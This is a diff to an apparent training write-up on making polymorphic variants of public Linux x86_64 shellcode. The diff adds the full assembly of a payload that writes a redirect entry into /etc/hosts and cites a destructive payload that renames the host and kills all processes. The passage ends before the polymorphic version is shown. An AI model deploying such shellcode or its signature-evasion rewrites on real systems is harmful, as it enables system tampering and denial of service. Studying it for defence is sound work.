@@ -14,6 +14,7 @@ Below are the three samples choosen with their original code and the polymorphic
 
 * Shellcode Name: Linux/x86_64 sethostname() & killall 33 bytes shellcode
 * Author: zbt
+* URL: [http://shell-storm.org/shellcode/files/shellcode-605.php](http://shell-storm.org/shellcode/files/shellcode-605.php)
 * Description: Changes the name of the host to "Rooted!" and then kills all processes running on the system
 * Original Shellcode Size: 33 bytes
 * Max Size of the polymorphic Version: 49 bytes
@@ -154,6 +155,63 @@ pop rsi        ==>       inc rsi
 ### Sample 2: 
 ---
 
+* Shellcode Name: Add map in /etc/hosts file
+* Author: Osanda (@OsandaMalith)
+* URL: [http://shell-storm.org/shellcode/files/shellcode-896.php](http://shell-storm.org/shellcode/files/shellcode-896.php)
+* Description: Adds entry in the `/etc/hosts` file
+* Original Shellcode Size: 110 bytes
+* Max Size of the polymorphic Version: 165 bytes
+* Size of the Created Polymorphic Version: **XXX bytes (below the 150%)**
+
+The original ASM file:
+```asm
+global _start
+    section .text
+
+_start:
+    ;open
+    xor rax, rax 
+    add rax, 2  ; open syscall
+    xor rdi, rdi
+    xor rsi, rsi
+    push rsi ; 0x00 
+    mov r8, 0x2f2f2f2f6374652f ; stsoh/
+    mov r10, 0x7374736f682f2f2f ; /cte/
+    push r10
+    push r8
+    add rdi, rsp
+    xor rsi, rsi
+    add si, 0x401
+    syscall
+
+    ;write
+    xchg rax, rdi
+    xor rax, rax
+    add rax, 1 ; syscall for write
+    jmp data
+
+write:
+    pop rsi 
+    mov dl, 19 ; length in rdx
+    syscall
+
+    ;close
+    xor rax, rax
+    add rax, 3
+    syscall
+
+    ;exit
+    xor rax, rax
+    mov al, 60
+    xor rdi, rdi
+    syscall 
+
+data:
+    call write
+    text db '127.1.1.1 google.lk'
+```
+
+Once applied polymorphic techniques, the code changes to:
 
 
 
